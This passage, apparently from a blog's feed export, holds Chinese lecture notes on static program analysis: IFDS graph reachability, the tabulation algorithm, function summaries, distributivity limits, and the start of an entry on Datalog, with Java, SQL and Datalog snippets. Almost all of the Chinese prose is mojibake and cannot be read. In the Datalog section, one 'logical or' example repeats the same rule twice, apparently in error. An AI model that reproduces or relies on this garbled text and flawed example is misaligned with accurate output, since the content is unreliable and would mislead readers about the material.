çš„è¾¹ï¼›</strong></p><p>å¯¹ä¸ä¸€ä¸ªç¨‹åºç‚¹pï¼Œå…¶ç»“æœæ˜¯ç”±å¤šä¸ªflow functionå½±å“ï¼Œè€Œåœ¨IFDSä¸Šå½±å“çš„ç»“æœç”±å›¾çš„å¯è¾¾æ€§è¡¨ç¤ºï¼Œè€ƒè™‘æœ‰$\lambda \text{ } S \cdot \{a\}$è¿™ä¸€ä¸ªfunctionï¼Œè‹¥æ²¡æœ‰$0\rightarrow0$ï¼Œé‚£ä¹ˆ<code>a</code>æ— æ³•å¯è¾¾ï¼Œåˆ†æç»“æœé”™è¯¯ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913175500202.png" alt="image-20200913175500202"></p><h2 id="Tabulation-Algorithm"><a href="#Tabulation-Algorithm" class="headerlink" title="Tabulation Algorithm"></a>Tabulation Algorithm</h2><p>é€šè¿‡å›¾å¯è¾¾æ€§æ¨å¯¼Possibly-uninitialized variablesï¼Œè¿˜éœ€æœ€åä¸€æ­¥ï¼Œå³åˆ¤æ–­è·¯å¾„æ˜¯å¦æˆç«‹ã€‚</p><p>ä¾‹å¦‚å¯¹äº$e_{main}$èŠ‚ç‚¹ä¸‹çš„$g$ï¼Œå¯ä»¥æ‰¾åˆ°$\langle S_{main},0\rangle \rightarrow \langle e_{main},g\rangle$çš„åˆæ³•è·¯å¾„ï¼Œå› æ­¤gæœ‰å¯èƒ½ä¸å­˜åœ¨å®šä¹‰ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913194055052.png" alt="image-20200913194055052" style="width:80%;"></p><p>è€Œå¯¹äº$Print(a,g)$èŠ‚ç‚¹ä¸‹çš„<code>g</code>ï¼Œå°½ç®¡å…¶å­˜åœ¨è·¯å¾„ï¼Œä½†æ˜¯è·¯å¾„åˆæ³•ï¼Œå› æ­¤gä¸å­˜åœ¨é›†åˆä¸­ï¼Œå³gä¸€å®šæ˜¯å·²å®šä¹‰çš„ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913194557198.png" alt="image-20200913194557198" style="width:80%;"></p><p>è®¡ç®—å›¾ä¸­ç‚¹çš„å¯è¾¾æ€§å³Tabulation Algorithmï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹äºä»$\langle S_{main},0\rangle $å¯è¾¾çš„ç‚¹ç”¨è“è‰²ç‚¹è¡¨ç¤ºï¼Œè¯¥ç®—æ³•å°±æ˜¯æ‰¾å‡ºè¿™äº›å¯è¾¾ï¼ˆè“è‰²ï¼‰çš„ç‚¹ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913195133207.png" alt="image-20200913195133207"></p><p>ç®—æ³•å†…å®¹å¦‚ä¸‹ï¼Œå…¶å¤æ‚åº¦ä¸º$O(ED^3)$ï¼Œè¯¾ç¨‹ä¸­å¹¶æ²¡æœ‰æ—¶é—´è¯´æ˜æ—¶é—´ç»†èŠ‚ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913180807055.png" alt="image-20200913180807055"></p><p>ç®—æ³•ä¸­ä¸»è¦æ€æƒ³æ˜¯åœ¨æ¯ä¸ªexit nodeå¤„è¿›è¡ŒCFL-Reachability æ£€æŸ¥ï¼Œè€Œå…¶ä»–nodeä¹‹é—´è‡ªç„¶å¯è¾¾ï¼ˆç»¿è‰²ï¼‰ï¼›</p><p>æ­¤å¤–ï¼Œå¢åŠ summary edgeï¼Œè¿æ¥$\langle Call, d_m\rangle \rightarrow \langle Ret, d_n \rangle$ï¼Œä½œä¸ºè®°å¿†ï¼ˆe.g., $a\rightarrow \{b\}$, $b\rightarrow\{b, c\}$ï¼‰ï¼Œä¸‹æ¬¡åšè¯¥å‡½æ•°è°ƒç”¨æ—¶ä¸éœ€è¦é‡å¤è®¡ç®—è¢«è°ƒå‡½æ•°å†…éƒ¨çš„pathï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913195831242.png" alt="image-20200913195831242"></p><h1 id="Function-summary"><a href="#Function-summary" class="headerlink" title="Function summary"></a>Function summary</h1><p>å¯¹äºç¨‹åºä¸­çš„åº“è°ƒç”¨å‡½æ•°ï¼Œå¯ä»¥ä½“ç°åšå‡½æ•°æ‘˜è¦ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20201003173839070.png" alt="image-20201003173839070"></p><p>åªè¦åœ¨åº“ä¸Šè·‘ä¸€é IDFS å°±å¯ä»¥å¾—åˆ°å‡½æ•°æ‘˜è¦ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20201003204423702.png" alt="image-20201003204423702"></p><p>å‡½æ•°æ‘˜è¦ä¸éœ€è¦ä¿å­˜å‡½æ•°å†…éƒ¨è½¬æ¢è¿‡ç¨‹ï¼ˆè“è‰²çº¿ï¼‰ï¼Œåªéœ€è¦ä¿å­˜è½¬æ¢ç»“æœï¼ˆçº¢è‰²çº¿ï¼‰ï¼Œä½†æ˜¯è¿™æ ·çš„è¯åšæ‘˜è¦å°±å¾—è®¡ç®—æ¯ä¸ªå˜é‡çš„å¯è¾¾æ€§ï¼Œå³å¤æ‚åº¦æ˜¯$O(n^2)$ï¼Œnä¸ºå˜é‡ä¸ªæ•°ï¼ˆè¿˜åŒ…æ‹¬å…¨å±€å˜é‡ï¼‰ã€‚</p><p><strong>å‡½æ•°æ‘˜è¦å®é™…ä¸Šå½¢å¼</strong>æ˜¯$f: \langle gen, kill\rangle$ï¼Œæ¢å¥è¯è¯´$f(x)=gen\cup(x-kill)$ï¼Œå‡½æ•°æ‰§è¡Œåˆå§‹å€¼ä¸º$\langle\{\},\{\}\rangle$ï¼‰</p><p>åœ¨å‡½æ•°å†…åšæ•°æ®æµåˆ†æï¼Œtransferä¸º$\left(g_{1}, k_{1}\right) \circ\left(g_{2}, k_{2}\right)=\left(g_{2} \cup\left(g_{1}-k_{2}\right), k_{1} \cup k_{2}\right)$ï¼š</p><script type="math/tex; mode=display">\begin{aligned}f_{2} \circ f_{1}(x) &=gen_{2} \cup\left(\left(gen_{1} \cup\left(x-kill_{1}\right)\right)-kill_{2}\right) \\&=\left(gen_{2} \cup\left(gen_{1}-kill_{2}\right)\right) \cup\left(x-\left(kill_{1} \cup kill_{2}\right)\right)\\\end{aligned}</script><p>æ±‡èšç‚¹æ“ä½œä¸º$\left(g_{1}, k_{1}\right) \sqcap\left(g_{2}, k_{2}\right)=\left(g_{1} \cup g_{2}, k_{1} \cap k_{2}\right)$ï¼š</p><script type="math/tex; mode=display">\begin{aligned}\left(f_{1} \sqcap f_{2}\right)(x) &=f_{1}(x) \sqcap f_{2}(x) \\&=\left(g e n_{1} \cup\left(x-k i l l_{1}\right)\right) \cup\left(g e n_{2} \cup\left(x-k i l l_{2}\right)\right) \\&=\left(g e n_{1} \cup g e n_{2}\right) \cup\left(x-\left(k i l l_{1} \cap k i l l_{2}\right)\right)\end{aligned}</script><p>é€šè¿‡è¯æ˜ï¼Œå¯è§ç”¨ä»¥ä¸Šæ–¹æ³•åšå‡ºæ¥çš„å‡½æ•°æ‘˜è¦è¿›è¡Œæ•°æ®æµåˆ†æï¼Œåˆ†æç»“æœå’ŒåŸæ•°æ®æµåˆ†æå®Œå…¨ç›¸åŒ(å…·æœ‰å•è°ƒæ€§ã€åˆ†é…æ€§å’Œæ­£ç¡®æ€§)ã€‚</p><p>è¿™é‡Œä¸ªäººæœ‰ä¸ªç–‘æƒ‘ï¼Œè€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Adder</span> </span>&#123; <span class="function">String <span class="title">add</span><span class="params">(String a,String b)</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder1</span> <span class="keyword">implements</span> <span class="title">Adder</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">(String a, String b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder2</span> <span class="keyword">implements</span> <span class="title">Adder</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">(String a, String b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+<span class="string">"b"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdderAgent</span> <span class="keyword">implements</span> <span class="title">Adder</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Adder adder;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AdderAgent</span><span class="params">(Adder a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.adder = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">(String a, String b)</span></span>&#123; <span class="comment">// summary this</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.adder.add(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">add</span><span class="params">(Adder adder, String a, String b)</span></span>&#123; <span class="comment">// summary this</span></span><br><span class="line">        <span class="keyword">return</span> adder.add(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦å¯¹<code>AdderAgent.add(Adder adder, String a, String b)</code>åšå‡½æ•°æ‘˜è¦ï¼Œé‚£ä¹ˆå…¶å› ä¸ºä¾èµ–äºadderçš„å®ç°ï¼Œå°±å¯èƒ½éœ€è¦åšä¸¤ä»½æ‘˜è¦ï¼Œå³è‹¥adder=Adder1æ—¶ï¼Œå…¶æ‘˜è¦æ˜¯$\langle(ret\rightarrow a+b),(ret\rightarrow any)\rangle$ï¼Œè‹¥adder=Adder2æ—¶ï¼Œå…¶æ‘˜è¦æ˜¯$\langle(ret\rightarrow a),(ret\rightarrow any)\rangle$ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¦åšä¸¤ä»½å‡½æ•°æ‘˜è¦ï¼Œè¿™é‡Œä»½æ•°å–å†³äºAdderå­ç±»çš„ä¸ªæ•°ã€‚</p><p>æ­¤å¤–ï¼Œå¯¹<code>AdderAgent.add(String a, String b)</code>è¿˜è¦ä¿å­˜å…¶æˆå‘˜å˜é‡ï¼ˆself.adderï¼‰çš„ç±»å‹ã€‚</p><h1 id="Understanding-the-Distributivity-of-IFDS"><a href="#Understanding-the-Distributivity-of-IFDS" class="headerlink" title="Understanding the Distributivity of IFDS"></a>Understanding the Distributivity of IFDS</h1><p>IFDSä¸èƒ½åšFlow functionä¸æ»¡è¶³åˆ†é…æ€§ï¼ˆ$F(x \wedge y) \neq F(x) \wedge F(y)$ï¼‰çš„æ•°æ®æµåˆ†æã€‚</p><p>ä»¥<strong>å¸¸é‡ä¼ æ’­</strong>ä¸ºä¾‹ï¼Œè€ƒè™‘<code>z=x+y</code>ï¼Œè®¾è®¡çš„Flow functionä¸º$(x,y,_)\rightarrow(x+y,_)$ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªè¾“å‡ºæ˜¯ä¸¤ä¸ªè¾“å…¥<strong>â€œåŒæ—¶â€</strong>å†³å®šçš„ï¼Œåœ¨representation relationä¸­æ˜¯æ— æ³•è¡¨ç¤ºçš„ï¼Œæ¢å¥è¯è¯´ï¼Œ<strong>IFDSåªèƒ½æè¿°data factï¼ˆç‚¹ï¼‰å’Œpropagationï¼ˆè¾¹ï¼‰èƒ½è¢«ç‹¬ç«‹å¤„ç†çš„åˆ†æé—®é¢˜</strong>ï¼ˆæŒ‰ä¸ªäººç†è§£ï¼ŒIFDSèƒ½å¤„ç†çš„ä¸€ä¸ªåŸå­æ“ä½œå°±æ˜¯$a \rightarrow b$ï¼Œå¯ä»¥ç‹¬ç«‹è¡¨ç¤º$a\rightarrow b,c\rightarrow b,b\rightarrow b$ï¼Œè€Œä¸èƒ½è¡¨ç¤º$a\wedge c \rightarrow b$ï¼‰ã€‚</p><p>åŒæ ·ï¼ŒIFDSä¸èƒ½ç”¨äº<strong>æŒ‡é’ˆåˆ†æ</strong>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå½“å¤„ç†<code>z=y.f</code>è¯­å¥æ—¶ï¼Œç”±äºæ²¡æœ‰åˆ«åä¿¡æ¯ï¼Œæ— æ³•è¿æ¥$x\rightarrow y.f$è¾¹ï¼Œå› æ­¤åˆ†æç»“æœæ˜¯é”™è¯¯çš„ï¼Œè€Œè‹¥åŠ ä¸Šåˆ«ååˆ†æï¼Œå› ä¸ºåˆæ˜¯å¤šè¾“å…¥ï¼Œå› æ­¤æŒ‡é’ˆåˆ†æä¹Ÿä¸æ»¡è¶³åˆ†é…æ€§ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913202232341.png" alt="image-20200913202232341"></p><p>IDEï¼ˆInterproceduralï¼ŒDistributiveï¼ŒEnvironment problemï¼‰ä½œä¸ºIFDSçš„ä¼˜åŒ–ï¼Œå¯ä»¥è§£å†³infiniteçš„é—®é¢˜ï¼Œä½†æ˜¯ä»éœ€æ»¡è¶³distributiveã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬èŠ‚è¯¾è®²äº†IFDSçš„å¤§è‡´æ€è·¯ï¼Œè¯¦ç»†è¿˜éœ€çœ‹æœ€åˆçš„è®ºæ–‡ï¼Œæ³¨æ„IFDSå’Œä¼ ç»Ÿçš„content-sensitiveæ˜¯æ²¡æœ‰å¯æ¯”æ€§çš„ã€‚</p><h1 id="Appendix-Context-free-Grammar"><a href="#Appendix-Context-free-Grammar" class="headerlink" title="Appendix: Context-free Grammar"></a>Appendix: Context-free Grammar</h1><blockquote><p>CFG is a formal grammar in which every production is of the form:</p><script type="math/tex; mode=display">S \rightarrow \alpha</script><p>where $S$ is  a single nonterminal and $\alpha$ could be a string of terminals and/or nonterminals,or empty.</p></blockquote><p>ç®€å•è¯´ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•å®šä¹‰äº†ä¸€ä¸ªå¥å­çš„ç”Ÿæˆè§„èŒƒï¼Œå³ $S\rightarrow \alpha$ ï¼Œå…¶ä¸­$S$ä¸ºä¸€ä¸ªéç»ˆç»“ç¬¦ï¼Œ$\alpha$å¯ä»¥ä½¿ä¸€ä¸ªç»ˆç»“/éç»ˆç»“ç¬¦å·ï¼Œæˆ–è€…æ˜¯ç©º($\varepsilon$)ã€‚</p><p>ä¾‹å¦‚æœ‰å¦‚ä¸‹ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼š</p><ul><li>$S \rightarrow aSb$</li><li>$S \rightarrow \varepsilon$</li></ul><p>é‚£ä¹ˆå¯ä»¥ç”Ÿæˆä¸€ä¸‹å¥å­â€abâ€œï¼Œâ€œaabbâ€ï¼Œâ€¦</p><p>ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ä¸ä¸Šä¸‹æ–‡ç›¸å…³ï¼ˆContext-sensitiveï¼‰æ–‡æ³•çš„åŒºåˆ«å°±åœ¨äºè¯­å¥ç”Ÿæˆè§„åˆ™ï¼Œæ— å…³æ–‡æ³•å¯ä»¥æ— è§†ä¸Šä¸‹æ–‡éšæ„åº”ç”¨è§„åˆ™ï¼Œè€Œç›¸å…³æ–‡æ³•çš„æ¯ä¸ªè§„åˆ™æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸‹æ‰æˆç«‹çš„ã€‚</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>Precise Interprocedural Dataflow Analysis via Graph Reachability. Thomas Reps, Susan Horwitz, and Mooly Sagiv, POPLâ€™95</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Feasible-and-Realizable-Paths&quot;&gt;&lt;a href=&quot;#Feasible-and-Realizable-Paths&quot; class=&quot;headerlink&quot; title=&quot;Feasible and Realizable Paths&quot;&gt;&lt;/a&gt;Feasible and Realizable Paths&lt;/h1&gt;&lt;h2 id=&quot;In-Feasible-Paths&quot;&gt;&lt;a href=&quot;#In-Feasible-Paths&quot; class=&quot;headerlink&quot; title=&quot;(In)Feasible Paths&quot;&gt;&lt;/a&gt;(In)Feasible Paths&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Infeasible Paths:&lt;/strong&gt; Paths in CFG that do not correspond to actual executions.&lt;/p&gt;
&lt;/blockquote&gt;&lt;p&gt;ç¨‹åºåœ¨CFGä¸­ä¼šå­˜åœ¨ä¸è¢«æ‰§è¡Œåˆ°è·¯å¾„ï¼Œè¿™äº›è·¯å¾„ä¼šæ±¡æŸ“åˆ†æç»“æœï¼Œç»™é™æ€åˆ†æå¸¦æ¥ä¸åˆ©å½±å“ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ±¡ç‚¹åˆ†æ" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
      <category term="æŒ‡é’ˆåˆ†æ" scheme="http://anemone.top/tags/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90/"/>
    
      <category term="IFDS" scheme="http://anemone.top/tags/IFDS/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88Datalog%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/</id>
    <published>2020-09-06T13:22:13.000Z</published>
    <updated>2020-10-02T12:59:57.729Z</updated>
    
    <content type="html"><![CDATA[<p>å…ˆå‰çš„åˆ†æç®—æ³•è™½ç„¶å±•ç¤ºäº†åˆ†æç»†èŠ‚ï¼Œä½†æ˜¯è¿‡äºå¤æ‚éš¾ä»¥å®ç°ï¼Œæœ¬è¯¾å°†ä»‹ç»ä¸€ç§ä¸€ç§å£°æ˜å¼è¯­è¨€ï¼ˆDatalogï¼‰ä»¥æ•°æ®é©±åŠ¨æ¨å¯¼çš„æ–¹å¼åšæŒ‡é’ˆåˆ†æå’Œæ±¡ç‚¹åˆ†æ</p><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><h2 id="Imperative-vs-Declarative"><a href="#Imperative-vs-Declarative" class="headerlink" title="Imperative vs Declarative"></a>Imperative vs Declarative</h2><p>Imperativeï¼ˆå‘½ä»¤å¼ï¼‰è¯­è¨€ä¸»è¦æœ‰Javaã€C/C++ç­‰ï¼Œå±•ç¤ºäº†è¯¦ç»†çš„å®ç°ç»†èŠ‚ï¼›</p><a id="more"></a><p>Declarativeï¼ˆå£°æ˜å¼ï¼‰è¯­è¨€ä¸»è¦æœ‰SQLç­‰ï¼Œå…¶å±è”½ç»†èŠ‚ï¼Œå› æ­¤ä»£ç é‡æ›´å°ï¼Œå¯è¯»æ€§æ›´å¼ºã€‚</p><p>å¦‚å¯¹äºæŸ¥æ‰¾æˆå¹´äººçš„ç¨‹åºï¼Œå‘½ä»¤å¼è¯­è¨€å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Set&lt;Person&gt; <span class="title">selectAdults</span><span class="params">(Set&lt;Person&gt; persons)</span> </span>&#123;</span><br><span class="line">    Set&lt;Person&gt; result = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Person person : persons)</span><br><span class="line">        <span class="keyword">if</span> (person.getAge() &gt;= <span class="number">18</span>)</span><br><span class="line">            result.add(person);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œå£°æ˜å¼è¯­è¨€å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Persons <span class="keyword">WHERE</span> Age &gt;= <span class="number">18</span>;</span><br></pre></td></tr></table></figure><p>å¯è§å‘½ä»¤å¼è¯­è¨€ä¸»è¦å¼ºè°ƒå¦‚ä½•åšï¼Œè€Œå£°æ˜å¼è¯­è¨€å¼ºè°ƒçš„æ˜¯åšä»€ä¹ˆã€‚</p><h1 id="Introduction-to-Datalog"><a href="#Introduction-to-Datalog" class="headerlink" title="Introduction to Datalog"></a>Introduction to Datalog</h1><p>Datalog æ˜¯ä¸€ç§å£°æ˜å¼è¯­è¨€ï¼Œæ˜¯ Prolog çš„å­é›†ï¼Œæœ€æ—©ç”¨äºæ•°æ®åº“æŸ¥è¯¢[1]ï¼Œè€Œå¦‚ä»Šå·²ç»è¢«ç”¨äºç¨‹åºåˆ†æã€å¤§æ•°æ®ã€äº‘è®¡ç®—ç­‰å¤šä¸ªé¢†åŸŸ</p><p>Datalog å³ â€œData+Logicâ€ï¼Œå…¶ç¨‹åºæ²¡æœ‰æ§åˆ¶æµï¼Œæ²¡æœ‰å‡½æ•°ï¼Œä¸æ˜¯ä¸€ä¸ªå›¾çµå®Œå¤‡çš„è¯­è¨€ã€‚</p><h2 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h2><h3 id="Predicates"><a href="#Predicates" class="headerlink" title="Predicates"></a>Predicates</h3><p>Datalog ä¸­æ•°æ®ç”¨è°“è¯ï¼ˆPredicatesï¼‰è¡¨ç¤ºï¼Œå…·ä½“æ¥è¯´ï¼Œè°“è¯æ˜¯ä¸€å¼ æ•°æ®è¡¨ï¼Œè¡¨ä¸­çš„æ¯æ¡æ•°æ®ååº”ä¸€ä¸ªäº‹å®ï¼ˆfactï¼‰ã€‚</p><div class="table-container"><table><thead><tr><th style="text-align:center">person</th><th>age</th></tr></thead><tbody><tr><td style="text-align:center">xiaoming</td><td>18</td></tr><tr><td style="text-align:center">xiaohong</td><td>23</td></tr></tbody></table></div><p>å¦‚ä»¥ä¸Šä¸ºAgeè¡¨ï¼Œ<strong>Age</strong>å°±æ˜¯ä¸€ä¸ªè°“è¯ï¼Œè€Œåœ¨Ageä¸­ <code>(&quot;xiaoming&quot;,18)</code> è¡¨ç¤ºâ€œå°æ˜æ˜¯18å²â€œï¼Œè¿™æ˜¯ä¸€ä¸ªäº‹å®ï¼Œè€Œ<code>(&quot;xiaohong&quot;,22)</code>è¡¨ç¤º â€œå°çº¢æ˜¯22å²â€ï¼Œè¡¨ä¸­æ²¡æœ‰è¿™ä¸ªæ•°æ®ï¼Œå› æ­¤è¿™ä¸æ˜¯ä¸€ä¸ªäº‹å®ã€‚</p><h3 id="Atoms"><a href="#Atoms" class="headerlink" title="Atoms"></a>Atoms</h3><p>Datalogä¸­çš„è°“è¯ç”¨ Atom è¡¨ç¤ºï¼Œä¸€ä¸ª Atom ï¼ˆå®é™…ä¸Šæ˜¯å…³ç³»å‹åŸå­â€”â€”relational atomï¼‰å½¢å¦‚<code>P(X1,X2,...,Xn)</code>ï¼Œå…¶ä¸­ <code>P</code> è¡¨ç¤ºè°“è¯åç§°ï¼Œè€Œ<code>X1,X2,...,Xn</code> è¡¨ç¤ºè°“è¯çš„å‚æ•°ï¼ˆArguments/termsï¼‰ï¼Œå‚æ•°æ˜¯å¯ä¸ºå˜é‡æˆ–æ˜¯å¸¸é‡ï¼Œè‹¥è¡¨ä¸­å­˜åœ¨æ•°æ®ï¼Œåˆ™å…³ç³»å‹æ•°æ®ä¸ºçœŸï¼Œå¦åˆ™</p><p>ä¾‹å¦‚å…ˆå‰Ageè°“è¯ï¼Œæœ‰å¦‚ä¸‹Atomsï¼š</p><ul><li><code>Age(person, age)</code></li><li><code>Age(&quot;xiaoming&quot;, 18)</code></li></ul><p>Atom å¦ä¸€ç±»ç§°ä¸ºç®—æ•°å‹åŸå­ï¼ˆarithmetic atomsï¼‰ï¼Œç”±ç®—æ•°è¡¨è¾¾å¼ç»„æˆï¼Œä¾‹å¦‚ï¼š</p><ul><li><code>age &gt;= 18</code></li></ul><h2 id="Logic"><a href="#Logic" class="headerlink" title="Logic"></a>Logic</h2><h3 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3><p>Rules åœ¨ Datalog ä¸­å®šä¹‰äº†factsçš„æ¨å¯¼è¿‡ç¨‹ï¼Œä¸€ä¸ªruleså½¢å¦‚ <code>H &lt;- B1, B2, ... ,Bn</code>ï¼Œå…¶ä¸­ <code>H</code> ï¼ˆheadï¼‰ä¸ºä¸€ä¸ª atomï¼Œè¡¨ç¤ºç»“è®ºï¼ˆconsequentï¼‰ï¼Œ<code>B1,B2,...,Bn</code> ï¼ˆbodyï¼‰è¡¨ç¤ºå‰ææ¡ä»¶ï¼ˆantecedentï¼‰ï¼ŒBiè¡¨ç¤ºä¸€ä¸ªå­ç›®æ ‡ï¼ˆsubgoalï¼‰ï¼Œ<code>,</code> è¡¨ç¤ºé€»è¾‘ä¸å…³ç³»ï¼Œå³ä¸Šä¾‹è¡¨ç¤ºâ€œå½“B1ã€B2ã€â€¦ã€Bnéƒ½æˆç«‹æ—¶ï¼ŒHæˆç«‹â€ã€‚</p><p>Datalog è¿è¡Œæ—¶å°†ä¸æ–­ä»å·²çŸ¥äº‹å®ä¸­æ¨å‡ºæ–°äº‹å®ï¼Œå½“æ— æ³•å†æ¨å‡ºæ–°çš„äº‹å®æ—¶ï¼Œç¨‹åºåœæ­¢ã€‚</p><h3 id="EDBå’ŒIDB"><a href="#EDBå’ŒIDB" class="headerlink" title="EDBå’ŒIDB"></a>EDBå’ŒIDB</h3><p>é€šå¸¸æ¥è¯´ï¼ŒDatalog æœ‰ä¸¤ç±»è°“è¯ï¼ŒEDBå’ŒIDBï¼š</p><p>EDBï¼ˆExtensional databaseï¼‰ï¼šEDBè°“è¯æ˜¯é¢„å…ˆå®šä¹‰å¥½çš„ï¼Œé€šå¸¸ä¸å¯å˜ï¼Œä½œä¸ºdatalogçš„è¾“å…¥ï¼ˆå³å¤–éƒ¨ä¼ å…¥ï¼Œextensionalï¼‰</p><p>IDBï¼ˆIntensional databaseï¼‰ï¼šIDB è°“è¯é€šå¸¸ç”±rulesæ¨å¯¼å‡ºï¼Œé€šå¸¸æ˜¯datalogçš„è¾“å‡ºã€‚</p><h3 id="Logical-Or"><a href="#Logical-Or" class="headerlink" title="Logical Or"></a>Logical Or</h3><p>æœ‰ä¸¤ç§æ–¹å¼è¡¨ç¤ºé€»è¾‘æˆ–ï¼š</p><ol><li><p>ç¼–å†™å¤šæ¡æ¨å¯¼è§„åˆ™ï¼Œå¦‚ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GradeOne(Person) &lt;- Age(person,<span class="number">17</span>).</span><br><span class="line">GradeOne(Person) &lt;- Age(person,<span class="number">17</span>).</span><br></pre></td></tr></table></figure></li><li><p>ç”¨<code>;</code>åˆ†å‰²æ¡ä»¶ï¼Œå¦‚ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GradeOne(person) &lt;- Age(person,<span class="number">17</span>);Age(person,<span 